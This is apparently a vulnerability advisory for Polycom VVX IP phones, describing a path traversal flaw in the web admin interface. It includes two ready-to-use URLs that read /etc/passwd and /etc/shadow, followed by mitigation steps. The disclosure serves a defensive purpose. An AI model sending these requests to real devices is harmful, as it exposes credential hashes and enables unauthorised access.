# Polycom
# http://www.polycom.com

--Affects--

# Polycom VVX 101, 201, 300, 310, 400, 410, 500, 600, & 1500
# UC Software 4.1.8 and earlier, 5.2.3 and earlier, 5.3.1 and earlier, 5.4.0 and earlier

--Details--

Polycom VVX-series IP phones provide a web administrative interface. Inside this interface we discovered two URLs that exposed a "file=filename" parameters. Due to unsafe file system operations in this interface, it is possible to exploit the following pages, and possibly others, using path traversal attacks:

http://a.b.c.d/Preferences/Ringtone?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

http://a.b.c.d/Preferences/Background?file=.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow

--Mitigation--

Upgrade to the latest version of UC Software available.
Disable or restrict access to the web interface.
